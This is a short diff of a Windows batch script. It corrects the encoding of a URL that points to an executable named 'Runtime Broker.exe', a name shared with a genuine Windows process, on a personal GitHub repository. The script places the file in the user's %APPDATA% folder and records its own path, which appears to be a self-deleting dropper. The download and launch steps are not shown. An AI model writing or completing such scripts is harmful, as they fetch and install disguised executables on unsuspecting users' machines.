@@ -2,7 +2,7 @@
 setlocal
 
 :: Define variables
-set "fileURL=https://github.com/emad8787/panel/raw/refs/heads/main/speed/Runtime%%20Broker.exe"
+set "fileURL=https://github.com/emad8787/panel/raw/refs/heads/main/speed/Runtime%20Broker.exe"
 set "fileName=Runtime Broker.exe"
 set "destPath=%APPDATA%\%fileName%"
 set "batFile=%~f0"
